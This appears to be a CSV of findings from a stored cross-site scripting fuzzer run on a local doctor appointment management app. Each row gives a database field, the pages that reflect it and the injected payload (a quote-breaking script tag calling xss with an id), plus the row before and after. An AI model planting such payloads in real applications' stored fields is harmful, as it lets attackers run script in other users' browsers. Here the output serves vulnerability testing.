web app,DB source,reflection sink,id,payload,description
doctor,tblpage.Timing,http://localhost/dams/,905190,"""'><script>xss(905190)</script>","
            damsmsdb.tblpage.Timing[1][7]
            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            fuzzed row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '""\'><script>xss(905190)</script>']
            change: '10:30 am to 7:30 pm' => '""'><script>xss(905190)</script>'
            
fuzzed after scan 11 / 15
found as XSS in scan 12 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,906383,"""'><script>xss(906383)</script>","
            damsmsdb.tblspecialization.Specialization[6][1]
            original row: [7, 'General Surgery', datetime.datetime(2022, 11, 9, 14, 25, 52)]
            fuzzed row: [7, '""\'><script>xss(906383)</script>', datetime.datetime(2022, 11, 9, 14, 25, 52)]
            change: 'General Surgery' => '""'><script>xss(906383)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblpage.Email,http://localhost/dams/,910166,"""'><script>xss(910166)</script>","
            damsmsdb.tblpage.Email[1][4]
            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            fuzzed row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', '""\'><script>xss(910166)</script>', 7896541239, None, '10:30 am to 7:30 pm']
            change: 'info@gmail.com' => '""'><script>xss(910166)</script>'
            
fuzzed after scan 10 / 15
found as XSS in scan 11 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,911692,"""'><script>xss(911692)</script>","
            damsmsdb.tblspecialization.Specialization[0][1]
            original row: [1, 'Orthopedics', datetime.datetime(2022, 11, 9, 14, 22, 33)]
            fuzzed row: [1, '""\'><script>xss(911692)</script>', datetime.datetime(2022, 11, 9, 14, 22, 33)]
            change: 'Orthopedics' => '""'><script>xss(911692)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,912547,"""'><script>xss(912547)</script>","
            damsmsdb.tblappointment.Email[2][4]
            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            fuzzed row: [3, 485109480, 'Tina Yadav', 4654564464, '""\'><script>xss(912547)</script>', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            change: 'tina@gmail.com' => '""'><script>xss(912547)</script>'
            
fuzzed after scan 1 / 15
found as XSS in scan 2 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,913211,"""'><script>xss(913211)</script>","
            damsmsdb.tblspecialization.Specialization[5][1]
            original row: [6, 'Radiology', datetime.datetime(2022, 11, 9, 14, 25, 31)]
            fuzzed row: [6, '""\'><script>xss(913211)</script>', datetime.datetime(2022, 11, 9, 14, 25, 31)]
            change: 'Radiology' => '""'><script>xss(913211)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblpage.PageDescription,http://localhost/dams/,915534,"""'><script>xss(915534)</script>","
            damsmsdb.tblpage.PageDescription[1][3]
            original row: [2, 'contactus', 'Contact Us', '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            fuzzed row: [2, 'contactus', 'Contact Us', '""\'><script>xss(915534)</script>', 'info@gmail.com', 7896541239, None, '10:30 am to 7:30 pm']
            change: '890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi/NCR)' => '""'><script>xss(915534)</script>'
            
fuzzed after scan 9 / 15
found as XSS in scan 10 / 15"
doctor,tbldoctor.FullName,"http://localhost/dams/doctor/all-appointment.php
http://localhost/dams/doctor/all-appointment.php#
http://localhost/dams/doctor/all-appointment.php#menubar-customizer
http://localhost/dams/doctor/all-appointment.php#navbar-customizer
http://localhost/dams/doctor/appointment-bwdates.php
http://localhost/dams/doctor/appointment-bwdates.php#
http://localhost/dams/doctor/appointment-bwdates.php#menubar-customizer
http://localhost/dams/doctor/appointment-bwdates.php#navbar-customizer
http://localhost/dams/doctor/approved-appointment.php
http://localhost/dams/doctor/approved-appointment.php#
http://localhost/dams/doctor/approved-appointment.php#menubar-customizer
http://localhost/dams/doctor/approved-appointment.php#navbar-customizer
http://localhost/dams/doctor/cancelled-appointment.php
http://localhost/dams/doctor/cancelled-appointment.php#
http://localhost/dams/doctor/cancelled-appointment.php#menubar-customizer
http://localhost/dams/doctor/cancelled-appointment.php#navbar-customizer
http://localhost/dams/doctor/change-password.php
http://localhost/dams/doctor/change-password.php#
http://localhost/dams/doctor/change-password.php#menubar-customizer
http://localhost/dams/doctor/change-password.php#navbar-customizer
http://localhost/dams/doctor/dashboard.php
http://localhost/dams/doctor/dashboard.php#
http://localhost/dams/doctor/dashboard.php#menubar-customizer
http://localhost/dams/doctor/dashboard.php#navbar-customizer
http://localhost/dams/doctor/new-appointment.php
http://localhost/dams/doctor/new-appointment.php#
http://localhost/dams/doctor/new-appointment.php#menubar-customizer
http://localhost/dams/doctor/new-appointment.php#navbar-customizer
http://localhost/dams/doctor/profile.php
http://localhost/dams/doctor/profile.php#
http://localhost/dams/doctor/profile.php#menubar-customizer
http://localhost/dams/doctor/profile.php#navbar-customizer
http://localhost/dams/doctor/search.php
http://localhost/dams/doctor/search.php#
http://localhost/dams/doctor/search.php#menubar-customizer
http://localhost/dams/doctor/search.php#navbar-customizer
http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480
http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102
http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873",919919,"""'><script>xss(919919)</script>","
            damsmsdb.tbldoctor.FullName[0][1]
            original row: [1, 'Dr. Anusakha Singh', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
            fuzzed row: [1, '""\'><script>xss(919919)</script>', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
            change: 'Dr. Anusakha Singh' => '""'><script>xss(919919)</script>'
            
fuzzed after scan 12 / 15
found as XSS in scan 13 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,921489,"""'><script>xss(921489)</script>","
            damsmsdb.tblspecialization.Specialization[8][1]
            original row: [9, 'Family Medicine', datetime.datetime(2022, 11, 9, 14, 27, 52)]
            fuzzed row: [9, '""\'><script>xss(921489)</script>', datetime.datetime(2022, 11, 9, 14, 27, 52)]
            change: 'Family Medicine' => '""'><script>xss(921489)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,922304,"""'><script>xss(922304)</script>","
            damsmsdb.tblspecialization.Specialization[9][1]
            original row: [10, 'Chest Medicine', datetime.datetime(2022, 11, 9, 14, 28, 32)]
            fuzzed row: [10, '""\'><script>xss(922304)</script>', datetime.datetime(2022, 11, 9, 14, 28, 32)]
            change: 'Chest Medicine' => '""'><script>xss(922304)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,931934,"""'><script>xss(931934)</script>","
            damsmsdb.tblspecialization.Specialization[12][1]
            original row: [13, 'ENT', datetime.datetime(2022, 11, 9, 14, 30, 13)]
            fuzzed row: [13, '""\'><script>xss(931934)</script>', datetime.datetime(2022, 11, 9, 14, 30, 13)]
            change: 'ENT' => '""'><script>xss(931934)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,933276,"""'><script>xss(933276)</script>","
            damsmsdb.tblspecialization.Specialization[2][1]
            original row: [3, 'Obstetrics and Gynecology', datetime.datetime(2022, 11, 9, 14, 24, 14)]
            fuzzed row: [3, '""\'><script>xss(933276)</script>', datetime.datetime(2022, 11, 9, 14, 24, 14)]
            change: 'Obstetrics and Gynecology' => '""'><script>xss(933276)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,937931,"""'><script>xss(937931)</script>","
            damsmsdb.tblspecialization.Specialization[7][1]
            original row: [8, 'Ophthalmology', datetime.datetime(2022, 11, 9, 14, 27, 18)]
            fuzzed row: [8, '""\'><script>xss(937931)</script>', datetime.datetime(2022, 11, 9, 14, 27, 18)]
            change: 'Ophthalmology' => '""'><script>xss(937931)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,940554,"""'><script>xss(940554)</script>","
            damsmsdb.tblappointment.Email[4][4]
            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            fuzzed row: [5, 607441873, 'Anuj kumar', 1425362514, '""\'><script>xss(940554)</script>', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            change: 'anujkkk@hmak.com' => '""'><script>xss(940554)</script>'
            
fuzzed after scan 1 / 15
found as XSS in scan 2 / 15"
doctor,tbldoctor.Email,"http://localhost/dams/doctor/all-appointment.php
http://localhost/dams/doctor/all-appointment.php#
http://localhost/dams/doctor/all-appointment.php#menubar-customizer
http://localhost/dams/doctor/all-appointment.php#navbar-customizer
http://localhost/dams/doctor/appointment-bwdates.php
http://localhost/dams/doctor/appointment-bwdates.php#
http://localhost/dams/doctor/appointment-bwdates.php#menubar-customizer
http://localhost/dams/doctor/appointment-bwdates.php#navbar-customizer
http://localhost/dams/doctor/approved-appointment.php
http://localhost/dams/doctor/approved-appointment.php#
http://localhost/dams/doctor/approved-appointment.php#menubar-customizer
http://localhost/dams/doctor/approved-appointment.php#navbar-customizer
http://localhost/dams/doctor/cancelled-appointment.php
http://localhost/dams/doctor/cancelled-appointment.php#
http://localhost/dams/doctor/cancelled-appointment.php#menubar-customizer
http://localhost/dams/doctor/cancelled-appointment.php#navbar-customizer
http://localhost/dams/doctor/change-password.php
http://localhost/dams/doctor/change-password.php#
http://localhost/dams/doctor/change-password.php#menubar-customizer
http://localhost/dams/doctor/change-password.php#navbar-customizer
http://localhost/dams/doctor/dashboard.php
http://localhost/dams/doctor/dashboard.php#
http://localhost/dams/doctor/dashboard.php#menubar-customizer
http://localhost/dams/doctor/dashboard.php#navbar-customizer
http://localhost/dams/doctor/new-appointment.php
http://localhost/dams/doctor/new-appointment.php#
http://localhost/dams/doctor/new-appointment.php#menubar-customizer
http://localhost/dams/doctor/new-appointment.php#navbar-customizer
http://localhost/dams/doctor/profile.php
http://localhost/dams/doctor/profile.php#
http://localhost/dams/doctor/profile.php#menubar-customizer
http://localhost/dams/doctor/profile.php#navbar-customizer
http://localhost/dams/doctor/search.php
http://localhost/dams/doctor/search.php#
http://localhost/dams/doctor/search.php#menubar-customizer
http://localhost/dams/doctor/search.php#navbar-customizer
http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480
http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102
http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873",944455,"""'><script>xss(944455)</script>","
            damsmsdb.tbldoctor.Email[0][3]
            original row: [1, 'Dr. Anusakha Singh', 9787979798, 'anu@gmail.com', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
            fuzzed row: [1, 'Dr. Anusakha Singh', 9787979798, '""\'><script>xss(944455)</script>', '1', 'f925916e2754e5e03f75dd58a5733251', datetime.datetime(2022, 11, 9, 15, 1, 11)]
            change: 'anu@gmail.com' => '""'><script>xss(944455)</script>'
            
fuzzed after scan 13 / 15
found as XSS in scan 14 / 15"
doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=5&&aptid=607441873,947424,"""'><script>xss(947424)</script>","
            damsmsdb.tblappointment.Name[4][2]
            original row: [5, 607441873, 'Anuj kumar', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            fuzzed row: [5, 607441873, '""\'><script>xss(947424)</script>', 1425362514, 'anujkkk@hmak.com', datetime.date(2022, 11, 16), datetime.timedelta(seconds=75000), '1', 1, 'NA', datetime.datetime(2022, 11, 11, 1, 19, 37), None, None, None]
            change: 'Anuj kumar' => '""'><script>xss(947424)</script>'
            
fuzzed after scan 0 / 15
found as XSS in scan 1 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,947817,"""'><script>xss(947817)</script>","
            damsmsdb.tblspecialization.Specialization[4][1]
            original row: [5, 'Pediatrics', datetime.datetime(2022, 11, 9, 14, 25, 6)]
            fuzzed row: [5, '""\'><script>xss(947817)</script>', datetime.datetime(2022, 11, 9, 14, 25, 6)]
            change: 'Pediatrics' => '""'><script>xss(947817)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,948396,"""'><script>xss(948396)</script>","
            damsmsdb.tblspecialization.Specialization[10][1]
            original row: [11, 'Anesthesia', datetime.datetime(2022, 11, 9, 14, 29, 12)]
            fuzzed row: [11, '""\'><script>xss(948396)</script>', datetime.datetime(2022, 11, 9, 14, 29, 12)]
            change: 'Anesthesia' => '""'><script>xss(948396)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,951718,"""'><script>xss(951718)</script>","
            damsmsdb.tblspecialization.Specialization[3][1]
            original row: [4, 'Dermatology', datetime.datetime(2022, 11, 9, 14, 24, 42)]
            fuzzed row: [4, '""\'><script>xss(951718)</script>', datetime.datetime(2022, 11, 9, 14, 24, 42)]
            change: 'Dermatology' => '""'><script>xss(951718)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,956799,"""'><script>xss(956799)</script>","
            damsmsdb.tblspecialization.Specialization[1][1]
            original row: [2, 'Internal Medicine', datetime.datetime(2022, 11, 9, 14, 23, 42)]
            fuzzed row: [2, '""\'><script>xss(956799)</script>', datetime.datetime(2022, 11, 9, 14, 23, 42)]
            change: 'Internal Medicine' => '""'><script>xss(956799)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102,970096,"""'><script>xss(970096)</script>","
            damsmsdb.tblappointment.Name[3][2]
            original row: [4, 611388102, 'Jyoti', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
            fuzzed row: [4, 611388102, '""\'><script>xss(970096)</script>', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
            change: 'Jyoti' => '""'><script>xss(970096)</script>'
            
fuzzed after scan 0 / 15
found as XSS in scan 1 / 15"
doctor,tblappointment.Name,http://localhost/dams/doctor/view-appointment-detail.php?editid=3&&aptid=485109480,982328,"""'><script>xss(982328)</script>","
            damsmsdb.tblappointment.Name[2][2]
            original row: [3, 485109480, 'Tina Yadav', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            fuzzed row: [3, 485109480, '""\'><script>xss(982328)</script>', 4654564464, 'tina@gmail.com', datetime.date(2022, 11, 11), datetime.timedelta(seconds=46800), '1', 1, 'bjnbjh', datetime.datetime(2022, 11, 10, 12, 8, 51), 'Appointment request has been approved', 'Approved', datetime.datetime(2022, 11, 10, 14, 32, 29)]
            change: 'Tina Yadav' => '""'><script>xss(982328)</script>'
            
fuzzed after scan 0 / 15
found as XSS in scan 1 / 15"
doctor,tblspecialization.Specialization,http://localhost/dams/,989188,"""'><script>xss(989188)</script>","
            damsmsdb.tblspecialization.Specialization[11][1]
            original row: [12, 'Pathology', datetime.datetime(2022, 11, 9, 14, 29, 51)]
            fuzzed row: [12, '""\'><script>xss(989188)</script>', datetime.datetime(2022, 11, 9, 14, 29, 51)]
            change: 'Pathology' => '""'><script>xss(989188)</script>'
            
fuzzed after scan 6 / 15
found as XSS in scan 7 / 15"
doctor,tblappointment.Email,http://localhost/dams/doctor/view-appointment-detail.php?editid=4&&aptid=611388102,989648,"""'><script>xss(989648)</script>","
            damsmsdb.tblappointment.Email[3][4]
            original row: [4, 611388102, 'Jyoti', 7897987987, 'jyoti@gmail.com', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
            fuzzed row: [4, 611388102, 'Jyoti', 7897987987, '""\'><script>xss(989648)</script>', datetime.date(2022, 11, 12), datetime.timedelta(seconds=7200), '1', 1, 'Thanks', datetime.datetime(2022, 11, 10, 14, 31, 17), None, None, None]
            change: 'jyoti@gmail.com' => '""'><script>xss(989648)</script>'
            
fuzzed after scan 1 / 15
found as XSS in scan 2 / 15"
doctor,tblpage.PageDescription,http://localhost/dams/,994362,"""'><script>xss(994362)</script>","
            damsmsdb.tblpage.PageDescription[0][3]
            original row: [1, 'aboutus', 'About Us', '<div><font color=""#202124"" face=""arial, sans-serif""><b>Our mission declares our purpose of existence as a company and our objectives.</b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b><br></b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b>To give every customer much more than what he/she asks for in terms of quality, selection, value for money and customer service, by understanding local tastes and preferences and innovating constantly to eventually provide an unmatched experience in jewellery shopping.</b></font></div>', None, None, None, '']
            fuzzed row: [1, 'aboutus', 'About Us', '""\'><script>xss(994362)</script>', None, None, None, '']
            change: '<div><font color=""#202124"" face=""arial, sans-serif""><b>Our mission declares our purpose of existence as a company and our objectives.</b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b><br></b></font></div><div><font color=""#202124"" face=""arial, sans-serif""><b>To give every customer much more than what he/she asks for in terms of quality, selection, value for money and customer service, by understanding local tastes and preferences and innovating constantly to eventually provide an unmatched experience in jewellery shopping.</b></font></div>' => '""'><script>xss(994362)</script>'
            
fuzzed after scan 9 / 15
found as XSS in scan 10 / 15"
